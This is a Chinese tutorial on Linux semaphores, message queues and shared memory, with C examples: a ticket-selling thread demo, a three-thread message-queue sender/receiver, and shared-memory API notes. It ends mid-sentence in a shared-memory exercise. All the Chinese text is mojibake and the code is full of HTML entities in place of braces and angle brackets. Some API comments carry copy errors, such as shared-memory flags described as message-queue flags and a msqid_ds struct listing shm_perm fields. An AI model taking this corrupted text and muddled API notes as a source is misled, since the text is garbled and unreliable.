æ¨¡æ‹Ÿä¹°ç¥¨è¿‡ç¨‹void *sell_ticket(void *arg) &#123; printf(\"å½“å‰çº¿ç¨‹IDï¼š%u\\n\", pthread_self()); int i; int flag; for (i = 0; i &lt; 10; i++) &#123; // å®Œæˆä¿¡å·é‡ \"å‡ 1\" æ“ä½œï¼Œå¦åˆ™æš‚åœæ‰§è¡Œ flag = sem_wait(&amp;mySem); if (flag == 0) &#123; if (ticket_sum > 0) &#123; sleep(1); printf(\"%u å–ç¬¬ %d å¼ ç¥¨\\n\", pthread_self(), 10 - ticket_sum + 1); ticket_sum--; &#125; // æ‰§è¡Œ â€œåŠ  1â€ æ“ä½œ sem_post(&amp;mySem); sleep(1); &#125; &#125; return 0;&#125;int main() &#123; int flag; int i; void *ans; // åˆ›å»º 4 ä¸ªçº¿ç¨‹ pthread_t tids[4]; // åˆå§‹åŒ–ä¿¡å·é‡ flag = sem_init(&amp;mySem, 0, 1); if (flag != 0) &#123; printf(\"åˆå§‹åŒ–ä¿¡å·é‡å¤±è´¥\\n\"); &#125; for (i = 0; i &lt; 4; i++) &#123; flag = pthread_create(&amp;tids[i], NULL, &amp;sell_ticket, NULL); if (flag != 0) &#123; printf(\"çº¿ç¨‹åˆ›å»ºå¤±è´¥!\"); return 0; &#125; &#125; sleep(10); for (i = 0; i &lt; 4; i++) &#123; flag = pthread_join(tids[i], &amp;ans); if (flag != 0) &#123; printf(\"tid=%d ç­‰å¾…å¤±è´¥ï¼\", tids[i]); return 0; &#125; &#125; // æ‰§è¡Œç»“æŸå‰ï¼Œé”€æ¯ä¿¡å·é‡ sem_destroy(&amp;mySem); return 0;&#125;/*å½“å‰çº¿ç¨‹ IDï¼š1199965952å½“å‰çº¿ç¨‹ IDï¼š1189476096å½“å‰çº¿ç¨‹ IDï¼š1168496384å½“å‰çº¿ç¨‹ IDï¼š11789862401199965952 å–ç¬¬ 1 å¼ ç¥¨1189476096 å–ç¬¬ 2 å¼ ç¥¨1199965952 å–ç¬¬ 3 å¼ ç¥¨1178986240 å–ç¬¬ 4 å¼ ç¥¨1168496384 å–ç¬¬ 5 å¼ ç¥¨1189476096 å–ç¬¬ 6 å¼ ç¥¨1199965952 å–ç¬¬ 7 å¼ ç¥¨1178986240 å–ç¬¬ 8 å¼ ç¥¨1168496384 å–ç¬¬ 9 å¼ ç¥¨1189476096 å–ç¬¬ 10 å¼ ç¥¨*/# è¿›ç¨‹é—´é€šä¿¡çš„å‡ ç§æ–¹å¼ # æ¶ˆæ¯é˜Ÿåˆ— æ¶ˆæ¯é˜Ÿåˆ—æ˜¯æ¶ˆæ¯çš„é“¾è¡¨ï¼Œå­˜æ”¾åœ¨å†…æ ¸ä¸­å¹¶ç”±æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦æ ‡è¯†ã€‚æ¶ˆæ¯é˜Ÿåˆ—å…‹æœäº†ä¿¡å·ä¼ é€’ä¿¡æ¯å°‘ï¼Œç®¡é“åªèƒ½æ‰¿è½½æ— æ ¼å¼å­—èŠ‚æµä»¥åŠç¼“å†²åŒºå¤§å°å—é™ç­‰ç‰¹ç‚¹ã€‚æ¶ˆæ¯é˜Ÿåˆ—æ˜¯ UNIX ä¸‹ä¸åŒè¿›ç¨‹ä¹‹é—´å¯å®ç°å…±äº«èµ„æºçš„ä¸€ç§æœºåˆ¶ï¼ŒUNIX å…è®¸ä¸åŒè¿›ç¨‹å°†æ ¼å¼åŒ–çš„æ•°æ®æµä»¥æ¶ˆæ¯é˜Ÿåˆ—å½¢å¼å‘é€ç»™ä»»æ„è¿›ç¨‹ã€‚å¯¹æ¶ˆæ¯é˜Ÿåˆ—å…·æœ‰æ“ä½œæƒé™çš„è¿›ç¨‹éƒ½å¯ä»¥ä½¿ç”¨ msget å®Œæˆå¯¹æ¶ˆæ¯é˜Ÿåˆ—çš„æ“ä½œæ§åˆ¶ã€‚é€šè¿‡ä½¿ç”¨æ¶ˆæ¯ç±»å‹ï¼Œè¿›ç¨‹å¯ä»¥æŒ‰ä»»ä½•é¡ºåºè¯»ä¿¡æ¯ï¼Œæˆ–ä¸ºæ¶ˆæ¯å®‰æ’ä¼˜å…ˆçº§é¡ºåº. # ç›¸å…³å‡½æ•° ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—éœ€è¦åŒ…å«å¤´æ–‡ä»¶ sys/msg.h # msgget åˆ›å»ºæ¶ˆæ¯é˜Ÿåˆ—ï¼Œkey å€¼å”¯ä¸€æ ‡è¯†è¯¥æ¶ˆæ¯é˜Ÿåˆ— /*@param key: æ¶ˆæ¯é˜Ÿåˆ—çš„åç§° (éé›¶æ•´æ•°)@param msgflg: æ§åˆ¶å½“å‰æ¶ˆæ¯é˜Ÿåˆ—æ»¡æˆ–é˜Ÿåˆ—æ¶ˆæ¯åˆ°è¾¾ç³»ç»ŸèŒƒå›´çš„é™åˆ¶æ—¶å°†è¦å‘ç”Ÿçš„äº‹æƒ…ã€‚msgflg é€šå¸¸å–å€¼ 0666, msgflg å¯ä»¥ä¸ IPC_CREAT åšæˆ–æ“ä½œï¼Œè¡¨ç¤ºå½“ key æ‰€å‘½åçš„æ¶ˆæ¯é˜Ÿåˆ—ä¸å­˜åœ¨æ—¶åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—*/int msgget(key_t key, int msgflg);# msgctl æ§åˆ¶æ¶ˆæ¯é˜Ÿåˆ— /*@param msqid: ç”± msgget å‡½æ•°è¿”å›çš„æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦ã€‚@param: cmd: æ˜¯å°†è¦é‡‡å–çš„åŠ¨ä½œï¼Œå®ƒå¯ä»¥å– 3 ä¸ªå€¼ï¼šIPC_STAT, IPC_SET, IPC_RMIDIPC_STATï¼šæŠŠ msqid_ds ç»“æ„ä¸­çš„æ•°æ®è®¾ç½®ä¸ºæ¶ˆæ¯é˜Ÿåˆ—çš„å½“å‰å…³è”å€¼ï¼Œå³ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„å½“å‰å…³è”å€¼è¦†ç›– msqid_ds çš„å€¼ã€‚IPC_SETï¼šå¦‚æœè¿›ç¨‹æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œå°±æŠŠæ¶ˆæ¯åˆ—é˜Ÿçš„å½“å‰å…³è”å€¼è®¾ç½®ä¸º msqid_ds ç»“æ„ä¸­ç»™å‡ºçš„å€¼IPC_RMIDï¼šåˆ é™¤æ¶ˆæ¯é˜Ÿåˆ—@param buf: buf æ˜¯æŒ‡å‘ msgid_ds ç»“æ„çš„æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘æ¶ˆæ¯é˜Ÿåˆ—æ¨¡å¼å’Œè®¿é—®æƒé™çš„ç»“æ„ã€‚msqid_ds ç»“æ„è‡³å°‘åŒ…æ‹¬ä»¥ä¸‹æˆå‘˜ï¼šstruct msqid_ds&#123; uid_t shm_perm.uid; uid_t shm_perm.gid; mode_t shm_perm.mode;&#125;;*/int msgctl(int msqid, int cmd, struct msqid_ds *buf);# msgsnd å‘é€æ¶ˆæ¯ /*@param msqid: ç”± msgget å‡½æ•°è¿”å›çš„æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦ã€‚@param msg_ptr: ä¸€ä¸ªæŒ‡å‘å‡†å¤‡å‘é€æ¶ˆæ¯çš„æŒ‡é’ˆï¼ŒæŒ‡é’ˆ msg_ptr æ‰€æŒ‡å‘çš„æ¶ˆæ¯ç»“æ„ä¸€å®šè¦æ˜¯ä»¥ä¸€ä¸ªé•¿æ•´å‹æˆå‘˜å˜é‡å¼€å§‹çš„ç»“æ„ä½“ï¼Œæ¥æ”¶å‡½æ•°å°†ç”¨è¿™ä¸ªæˆå‘˜æ¥ç¡®å®šæ¶ˆæ¯çš„ç±»å‹ã€‚@param msg_sz: msg_ptr æŒ‡å‘çš„æ¶ˆæ¯çš„é•¿åº¦ï¼Œæ³¨æ„æ˜¯æ¶ˆæ¯çš„é•¿åº¦ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç»“æ„ä½“çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯è¯´ msg_sz æ˜¯ä¸åŒ…æ‹¬é•¿æ•´å‹æ¶ˆæ¯ç±»å‹æˆå‘˜å˜é‡çš„é•¿åº¦ã€‚@param msgflg: æ§åˆ¶å½“å‰æ¶ˆæ¯é˜Ÿåˆ—æ»¡æˆ–é˜Ÿåˆ—æ¶ˆæ¯åˆ°è¾¾ç³»ç»ŸèŒƒå›´çš„é™åˆ¶æ—¶å°†è¦å‘ç”Ÿçš„äº‹æƒ…ã€‚*/int msgsnd(int msqid, const void *msg_ptr, size_t msg_sz, int msgflg);# msgrcv æ¥æ”¶æ¶ˆæ¯ /*@param msqid: ç”± msgget å‡½æ•°è¿”å›çš„æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦ã€‚@param msg_ptr: ä¸€ä¸ªæŒ‡å‘å‡†å¤‡å‘é€æ¶ˆæ¯çš„æŒ‡é’ˆï¼ŒæŒ‡é’ˆ msg_ptr æ‰€æŒ‡å‘çš„æ¶ˆæ¯ç»“æ„ä¸€å®šè¦æ˜¯ä»¥ä¸€ä¸ªé•¿æ•´å‹æˆå‘˜å˜é‡å¼€å§‹çš„ç»“æ„ä½“ï¼Œæ¥æ”¶å‡½æ•°å°†ç”¨è¿™ä¸ªæˆå‘˜æ¥ç¡®å®šæ¶ˆæ¯çš„ç±»å‹ã€‚@param msg_sz: msg_ptr æŒ‡å‘çš„æ¶ˆæ¯çš„é•¿åº¦ï¼Œæ³¨æ„æ˜¯æ¶ˆæ¯çš„é•¿åº¦ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç»“æ„ä½“çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯è¯´ msg_sz æ˜¯ä¸åŒ…æ‹¬é•¿æ•´å‹æ¶ˆæ¯ç±»å‹æˆå‘˜å˜é‡çš„é•¿åº¦ã€‚@param msgtype: msgtype å¯ä»¥å®ç°ä¸€ç§ç®€å•çš„æ¥æ”¶ä¼˜å…ˆçº§ã€‚å¦‚æœ msgtype ä¸º 0ï¼Œå°±è·å–é˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯ã€‚å¦‚æœå®ƒçš„å€¼å¤§äºé›¶ï¼Œå°†è·å–å…·æœ‰ç›¸åŒæ¶ˆæ¯ç±»å‹çš„ç¬¬ä¸€ä¸ªä¿¡æ¯ã€‚å¦‚æœå®ƒå°äºé›¶ï¼Œå°±è·å–ç±»å‹ç­‰äºæˆ–å°äº msgtype çš„ç»å¯¹å€¼çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯ã€‚@param msgflg: æ§åˆ¶å½“å‰æ¶ˆæ¯é˜Ÿåˆ—æ»¡æˆ–é˜Ÿåˆ—æ¶ˆæ¯åˆ°è¾¾ç³»ç»ŸèŒƒå›´çš„é™åˆ¶æ—¶å°†è¦å‘ç”Ÿçš„äº‹æƒ…ã€‚*/int msgrcv(int msqid, void *msg_ptr, size_t msg_sz, long int msgtype, int msgflg);# ç¤ºä¾‹ï¼šåˆ©ç”¨ Linux çš„æ¶ˆæ¯é˜Ÿåˆ—é€šä¿¡æœºåˆ¶å®ç°ä¸¤ä¸ªçº¿ç¨‹é—´çš„é€šä¿¡ ç¼–å†™ç¨‹åºåˆ›å»ºä¸‰ä¸ªçº¿ç¨‹ï¼šsender1 çº¿ç¨‹ã€sender2 çº¿ç¨‹å’Œ receive çº¿ç¨‹ï¼Œä¸‰ä¸ªçº¿ç¨‹çš„åŠŸèƒ½ã€‚æè¿°å¦‚ä¸‹ï¼š sender1 çº¿ç¨‹ï¼šè¿è¡Œå‡½æ•° sender1 ()ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œç„¶åç­‰å¾…ç”¨æˆ·é€šè¿‡ç»ˆç«¯è¾“å…¥ä¸€ä¸²å­—ç¬¦ï¼Œå¹¶å°†è¿™ä¸²å­—ç¬¦é€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—å‘é€ç»™ receiver çº¿ç¨‹ï¼›å¯å¾ªç¯å‘é€å¤šä¸ªæ¶ˆæ¯ï¼Œç›´åˆ°ç”¨æˆ·è¾“å…¥ â€œexitâ€ ä¸ºæ­¢ï¼Œè¡¨ç¤ºå®ƒä¸å†å‘é€æ¶ˆæ¯ï¼Œæœ€åå‘ receiver çº¿ç¨‹å‘é€æ¶ˆæ¯ â€œend1â€ï¼Œå¹¶ä¸”ç­‰å¾… receiver çš„åº”ç­”ï¼Œç­‰åˆ°åº”ç­”æ¶ˆæ¯åï¼Œå°†æ¥æ”¶åˆ°çš„åº”ç­”ä¿¡æ¯æ˜¾ç¤ºåœ¨ç»ˆç«¯å±å¹•ä¸Šï¼Œç»“æŸçº¿ç¨‹çš„è¿è¡Œã€‚ sender2 çº¿ç¨‹ï¼šè¿è¡Œå‡½æ•° sender2 ()ï¼Œå…±äº« sender1 åˆ›å»ºçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œç­‰å¾…ç”¨æˆ·é€šè¿‡ç»ˆç«¯è¾“å…¥ä¸€ä¸²å­—ç¬¦ï¼Œå¹¶å°†è¿™ä¸²å­—ç¬¦é€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—å‘é€ç»™ receiver çº¿ç¨‹ï¼›å¯å¾ªç¯å‘é€å¤šä¸ªæ¶ˆæ¯ï¼Œ ç›´åˆ°ç”¨æˆ·è¾“å…¥ â€œexitâ€ ä¸ºæ­¢ï¼Œè¡¨ç¤ºå®ƒä¸å†å‘é€æ¶ˆæ¯ï¼Œæœ€åå‘ receiver çº¿ç¨‹å‘é€æ¶ˆæ¯ â€œend2â€ï¼Œ å¹¶ä¸”ç­‰å¾… receiver çš„åº”ç­”ï¼Œç­‰åˆ°åº”ç­”æ¶ˆæ¯åï¼Œå°†æ¥æ”¶åˆ°çš„åº”ç­”ä¿¡æ¯æ˜¾ç¤ºåœ¨ç»ˆç«¯å±å¹•ä¸Šï¼Œç»“æŸ çº¿ç¨‹çš„è¿è¡Œã€‚ receiver çº¿ç¨‹ï¼šè¿è¡Œå‡½æ•° receive ()ï¼Œå®ƒé€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—æ¥æ”¶æ¥è‡ª sender1 å’Œ sender2 ä¸¤ ä¸ªçº¿ç¨‹çš„æ¶ˆæ¯ï¼Œå°†æ¶ˆæ¯æ˜¾ç¤ºåœ¨ç»ˆç«¯å±å¹•ä¸Šï¼Œå½“æ”¶åˆ°å†…å®¹ä¸º â€œend1â€ çš„æ¶ˆæ¯æ—¶ï¼Œå°±å‘ sender1 å‘é€ä¸€ä¸ªåº”ç­”æ¶ˆæ¯ â€œover1â€ï¼› å½“æ”¶åˆ°å†…å®¹ä¸º â€œend2â€ çš„æ¶ˆæ¯æ—¶ï¼Œå°±å‘ sender2 å‘é€ä¸€ä¸ªåº”ç­”æ¶ˆæ¯ â€œover2â€ï¼›æ¶ˆæ¯æ¥æ”¶å®Œæˆååˆ é™¤æ¶ˆæ¯é˜Ÿåˆ—ï¼Œç»“æŸçº¿ç¨‹çš„è¿è¡Œã€‚é€‰æ‹©åˆé€‚çš„ä¿¡å·é‡æœºåˆ¶å®ç°ä¸‰ä¸ªçº¿ç¨‹ä¹‹é—´çš„åŒæ­¥ä¸äº’æ–¥ã€‚ #include &lt;stdio.h>#include &lt;stdlib.h>#include &lt;string.h>#include &lt;pthread.h>#include &lt;sys/types.h>#include &lt;sys/ipc.h>#include &lt;sys/msg.h>#include &lt;semaphore.h>#define MAX_MSG_SIZE 256#define SENDER1_MSG_TYPE 1#define SENDER2_MSG_TYPE 2#define RECEIVER_MSG_TYPE 3struct message &#123; long mtype; char mtext[MAX_MSG_SIZE];&#125;;int msgQueueID;/*@signal send: å¯¹çº¿ç¨‹ sender1 å’Œ sender2 ä¸Šé”ï¼Œä¸¤ä¸ªçº¿ç¨‹æ˜¯äº’æ–¥çš„@signal receive: å¯¹ sender å‘é€æ¶ˆæ¯ç»™ receiver çš„è¿‡ç¨‹ä¸Šé”ï¼Œé˜²æ­¢ receiver å®Œæˆæ¥å—æ¶ˆæ¯çš„åŠ¨ä½œä¹‹å‰ï¼Œsender å¼€å§‹ä¸‹ä¸€è½®æ¥å—æ¶ˆæ¯@signal ifexit: å½“ sender1 å‘é€ end1 æ¶ˆæ¯ç»™ receiver,receiver å°†ä¼šå‘é€ over1 ç»™ sender1, ä½†æ˜¯ over1 æ¶ˆæ¯æœ‰æ¦‚ç‡ä¼šè¢« receiver è‡ªèº«æ¥å—*/sem_t send,receive,ifexit;void* sender1() &#123; struct message msg; int running = 1; sem_wait(&amp;send); while (running) &#123; sem_wait(&amp;receive); printf(\"Sender1: Enter a message (or 'exit' to quit): \"); fgets(msg.mtext, MAX_MSG_SIZE, stdin); msg.mtext[strcspn(msg.mtext, \"\\n\")] = '\\0'; msg.mtype = SENDER1_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); if (strcmp(msg.mtext, \"exit\") == 0) &#123; running = 0; &#125; &#125; sem_wait(&amp;receive);// è¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯é˜²æ­¢ä¿¡å·é‡ receive è¢«èµ‹å€¼ä¸º 2, åŒæ—¶ä¹Ÿç¡®ä¿äº†æ¶ˆæ¯å‘é€å’Œæ¥æ”¶çš„æ­£ç¡®è¿›è¡Œ strcpy(msg.mtext, \"end1\"); msg.mtype = SENDER1_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); msgrcv(msgQueueID, &amp;msg, MAX_MSG_SIZE, 0, 0); if(strcmp(msg.mtext, \"over1\") == 0)&#123; printf(\"Sender1: Exiting.\\n\"); &#125; sem_post(&amp;ifexit);// é€šçŸ¥ receiver: sender1 å‡†å¤‡é€€å‡º sem_post(&amp;send);// é€šçŸ¥ sender2: å¯ä»¥å‡†å¤‡æ¥æ”¶æ¶ˆæ¯ pthread_exit(NULL);&#125;void* sender2() &#123; struct message msg; int running = 1; sem_wait(&amp;send); while (running) &#123; sem_wait(&amp;receive); printf(\"Sender2: Enter a message (or 'exit' to quit): \"); fgets(msg.mtext, MAX_MSG_SIZE, stdin); msg.mtext[strcspn(msg.mtext, \"\\n\")] = '\\0'; msg.mtype = SENDER2_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); if (strcmp(msg.mtext, \"exit\") == 0) &#123; running = 0; &#125; &#125; sem_wait(&amp;receive);// è¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯é˜²æ­¢ä¿¡å·é‡ receive è¢«èµ‹å€¼ä¸º 2, åŒæ—¶ä¹Ÿç¡®ä¿äº†æ¶ˆæ¯å‘é€å’Œæ¥æ”¶çš„æ­£ç¡®è¿›è¡Œ strcpy(msg.mtext, \"end2\"); msg.mtype = SENDER2_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); msgrcv(msgQueueID, &amp;msg, MAX_MSG_SIZE, 0, 0); if(strcmp(msg.mtext, \"over2\") == 0)&#123; printf(\"Sender2: Exiting.\\n\"); &#125; sem_post(&amp;ifexit); sem_post(&amp;send); pthread_exit(NULL);&#125;void* receiver() &#123; struct message msg; int running = 2; while (running) &#123; msgrcv(msgQueueID, &amp;msg, MAX_MSG_SIZE, 0, 0); if(msg.mtype == SENDER1_MSG_TYPE)&#123; if (strcmp(msg.mtext, \"end1\") == 0) &#123; strcpy(msg.mtext, \"over1\"); msg.mtype = RECEIVER_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); running-=1; sem_wait(&amp;ifexit);// ç­‰å¾…é€€å‡ºåŠ¨ä½œå®Œæˆ &#125; else&#123; printf(\"Receiver: Message received: %s from sender1\\n\", msg.mtext); &#125; &#125; else if(msg.mtype == SENDER2_MSG_TYPE)&#123; if (strcmp(msg.mtext, \"end2\") == 0) &#123; strcpy(msg.mtext, \"over2\"); msg.mtype = RECEIVER_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); running-=1; sem_wait(&amp;ifexit);// ç­‰å¾…é€€å‡ºåŠ¨ä½œå®Œæˆ &#125; else&#123; printf(\"Receiver: Message received: %s from sender2\\n\", msg.mtext); &#125; &#125; sem_post(&amp;receive); &#125; msgctl(msgQueueID, IPC_RMID, NULL); printf(\"Receiver: Exiting.\\n\"); pthread_exit(NULL);&#125;int main() &#123; pthread_t sender1Thread, sender2Thread, receiverThread; key_t key = 5555; msgQueueID = msgget(key, IPC_CREAT | 0666); if (msgQueueID == -1) &#123; perror(\"Failed to create message queue\"); exit(1); &#125; sem_init(&amp;send,1,1); sem_init(&amp;receive,1,1); sem_init(&amp;ifexit,1,0); pthread_create(&amp;sender1Thread, NULL, sender1, NULL); pthread_create(&amp;sender2Thread, NULL, sender2, NULL); pthread_create(&amp;receiverThread, NULL, receiver, NULL); pthread_join(sender1Thread, NULL); pthread_join(sender2Thread, NULL); pthread_join(receiverThread, NULL); return 0;&#125;# å…±äº«å†…å­˜ å…±äº«å†…å­˜å¹¶æœªæä¾›åŒæ­¥æœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç¬¬ä¸€ä¸ªè¿›ç¨‹ç»“æŸå¯¹å…±äº«å†…å­˜çš„å†™æ“ä½œä¹‹å‰ï¼Œå¹¶æ— è‡ªåŠ¨æœºåˆ¶å¯ä»¥é˜»æ­¢ç¬¬äºŒä¸ªè¿›ç¨‹å¼€å§‹å¯¹å®ƒè¿›è¡Œè¯»å–ã€‚æ‰€ä»¥æˆ‘ä»¬é€šå¸¸éœ€è¦ç”¨å…¶ä»–çš„æœºåˆ¶æ¥åŒæ­¥å¯¹å…±äº«å†…å­˜çš„è®¿é—®ï¼Œä¾‹å¦‚å‰é¢è¯´åˆ°çš„ä¿¡å·é‡ ä½¿ç”¨å…±äº«å†…å­˜éœ€è¦åŒ…å«å¤´æ–‡ä»¶ sys/shm.h # ç›¸å…³å‡½æ•° # shmget åˆ›å»ºå…±äº«å†…å­˜ /*@param key: ä¸ºå…±äº«å†…å­˜æ®µå‘½å@param size: ä»¥å­—èŠ‚ä¸ºå•ä½æŒ‡å®šéœ€è¦å…±äº«çš„å†…å­˜å®¹é‡@param shmflg: æ§åˆ¶å½“å‰æ¶ˆæ¯é˜Ÿåˆ—æ»¡æˆ–é˜Ÿåˆ—æ¶ˆæ¯åˆ°è¾¾ç³»ç»ŸèŒƒå›´çš„é™åˆ¶æ—¶å°†è¦å‘ç”Ÿçš„äº‹æƒ…ã€‚shmflg é€šå¸¸å–å€¼ 0666, shmflg å¯ä»¥ä¸ IPC_CREAT åšæˆ–æ“ä½œï¼Œè¡¨ç¤ºå½“ key æ‰€å‘½åçš„å…±äº«å†…å­˜ä¸å­˜åœ¨æ—¶åˆ›å»ºä¸€ä¸ªå…±äº«å†…å­˜@return: æˆåŠŸæ—¶è¿”å›ä¸€ä¸ªä¸ key ç›¸å…³çš„å…±äº«å†…å­˜æ ‡è¯†ç¬¦ï¼ˆéè´Ÿæ•´æ•°ï¼‰ï¼Œç”¨äºåç»­çš„å…±äº«å†…å­˜å‡½æ•°ã€‚è°ƒç”¨å¤±è´¥è¿”å› - 1*/int shmget(key_t key, size_t size, int shmflg);# shmat ç¬¬ä¸€æ¬¡åˆ›å»ºå®Œå…±äº«å†…å­˜æ—¶ï¼Œå®ƒè¿˜ä¸èƒ½è¢«ä»»ä½•è¿›ç¨‹è®¿é—®ï¼Œshmat å‡½æ•°çš„ä½œç”¨å°±æ˜¯ç”¨æ¥å¯åŠ¨å¯¹è¯¥å…±äº«å†…å­˜çš„è®¿é—®ï¼Œå¹¶æŠŠå…±äº«å†…å­˜è¿æ¥åˆ°å½“å‰è¿›ç¨‹çš„åœ°å€ç©ºé—´ /*@param shm_id: ç”± shmget å‡½æ•°è¿”å›çš„å…±äº«å†…å­˜æ ‡è¯†ã€‚@param shm_addr: æŒ‡å®šå…±äº«å†…å­˜è¿æ¥åˆ°å½“å‰è¿›ç¨‹ä¸­çš„åœ°å€ä½ç½®ï¼Œé€šå¸¸ä¸ºç©ºï¼Œè¡¨ç¤ºè®©ç³»ç»Ÿæ¥é€‰æ‹©å…±äº«å†…å­˜çš„åœ°å€ã€‚@param shm_flg: æ ‡å¿—ä½ï¼Œé€šå¸¸ä¸º 0ã€‚@return: è°ƒç”¨æˆåŠŸæ—¶è¿”å›ä¸€ä¸ªæŒ‡å‘å…±äº«å†…å­˜ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æŒ‡é’ˆï¼Œå¦‚æœè°ƒç”¨å¤±è´¥è¿”å› - 1.*/void *shmat(int shm_id, const void *shm_addr, int shmflg);# shmdt è¯¥å‡½æ•°ç”¨äºå°†å…±äº«å†…å­˜ä»å½“å‰è¿›ç¨‹ä¸­åˆ†ç¦»ã€‚æ³¨æ„ï¼Œå°†å…±äº«å†…å­˜åˆ†ç¦»å¹¶ä¸æ˜¯åˆ é™¤å®ƒï¼Œåªæ˜¯ä½¿è¯¥å…±äº«å†…å­˜å¯¹å½“å‰è¿›ç¨‹ä¸å†å¯ç”¨ /*@param shmaddr: shmat å‡½æ•°è¿”å›çš„åœ°å€æŒ‡é’ˆ@return: è°ƒç”¨æˆåŠŸæ—¶è¿”å› 0ï¼Œå¤±è´¥æ—¶è¿”å› - 1*/int shmdt(const void *shmaddr);# shmctl ç±»æ¯”ä¿¡å·é‡ä¸­çš„ semctl å‡½æ•°ï¼Œç”¨æ¥æ§åˆ¶å…±äº«å†…å­˜ /*@param shm_id: ç”± shmget å‡½æ•°è¿”å›çš„å…±äº«å†…å­˜æ ‡è¯†ã€‚@param command: è¦é‡‡å–çš„æ“ä½œï¼Œå®ƒå¯ä»¥å–ä¸‹é¢çš„ä¸‰ä¸ªå€¼ ï¼šIPC_STATï¼šæŠŠ shmid_ds ç»“æ„ä¸­çš„æ•°æ®è®¾ç½®ä¸ºå…±äº«å†…å­˜çš„å½“å‰å…³è”å€¼ï¼Œå³ç”¨å…±äº«å†…å­˜çš„å½“å‰å…³è”å€¼è¦†ç›– shmid_ds çš„å€¼ã€‚IPC_SETï¼šå¦‚æœè¿›ç¨‹æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œå°±æŠŠå…±äº«å†…å­˜çš„å½“å‰å…³è”å€¼è®¾ç½®ä¸º shmid_ds ç»“æ„ä¸­ç»™å‡ºçš„å€¼IPC_RMIDï¼šåˆ é™¤å…±äº«å†…å­˜æ®µ@param buf: buf æ˜¯ä¸€ä¸ªç»“æ„æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘å…±äº«å†…å­˜æ¨¡å¼å’Œè®¿é—®æƒé™çš„ç»“æ„ã€‚shmid_ds ç»“æ„è‡³å°‘åŒ…æ‹¬ä»¥ä¸‹æˆå‘˜ï¼šstruct shmid_ds&#123; uid_t shm_perm.uid; uid_t shm_perm.gid; mode_t shm_perm.mode;&#125;;*/int shmctl(int shm_id, int command, struct shmid_ds *buf);# ç¤ºä¾‹ï¼šåˆ©ç”¨ Linux çš„å…±äº«å†…å­˜é€šä¿¡æœºåˆ¶å®ç°ä¸¤ä¸ªè¿›ç¨‹é—´çš„é€šä¿¡ ç¼–å†™ç¨‹åº senderï¼Œå®ƒåˆ›å»ºä¸€ä¸ªå…±äº«å†…å­˜ï¼Œç„¶åéšæœºäº§ç”Ÿä¸€ä¸ª 100 ä»¥å†…çš„è®¡ç®—è¡¨è¾¾å¼ï¼ˆä¾‹å¦‚ 12+34ï¼‰ï¼Œå¹¶å°†è¿™ä¸²è¡¨è¾¾å¼å­—ç¬¦ä¸²é€šè¿‡å…±äº«å†…å­˜å‘é€ç»™ receiverï¼›æœ€åï¼Œreceiver å®Œæˆè¡¨è¾¾å¼è¿ç®—åï¼Œå°†è®¡ç®—ç»“æœ (36) å†™åˆ°å…±äº«å†…å­˜ ï¼Œsender æ”¶åˆ°åº”ç­”æ¶ˆæ¯åï¼Œå°†æ¥æ”¶åˆ°çš„è®¡ç®—ç»“æœæ˜¾ç¤ºåœ¨ç»ˆç«¯å±å¹•ä¸Šã€‚ä¸Šè¿°è®¡ç®—é‡å¤ 10 æ¬¡åï¼Œsender å‘ receiver å‘é€â€endâ€ï¼Œç­‰å¾… recever å‘é€â€overâ€ ä¿¡æ¯åï¼Œåˆ é™¤å…±äº«å†…å­˜ï¼Œç»“æŸç¨‹åºçš„è¿è¡Œã€‚ ç¼–å†™ç¨‹åº receiverï¼Œ å®ƒé€šè¿‡å…±äº«å†…å­˜æ¥æ”¶æ¥è‡ª sender äº§ç”Ÿçš„ä¿¡æ¯ï¼Œå¦‚æœè¯¥ä¿¡æ¯æ˜¯è®¡ç®—è¡¨è¾¾å¼ï¼Œåˆ™å°†è¡¨è¾¾å¼æ˜¾ç¤ºåœ¨ç»ˆç«¯å±å¹•ä¸Šï¼Œç„¶åè®¡ç®—è¡¨è¾¾å¼çš„ç»“æœï¼Œå†é€šè¿‡è¯¥å…±äº«å†…å­˜å‘ sender å‘é€è®¡ç®—ç»“æœï¼Œç­‰å¾…æ¥æ”¶ä¸‹ä¸€ä¸ªæ¶ˆæ¯ï¼›å¦‚æœè¯¥ä¿¡æ¯æ˜¯â€endâ€ï¼Œåˆ™å‘ sender 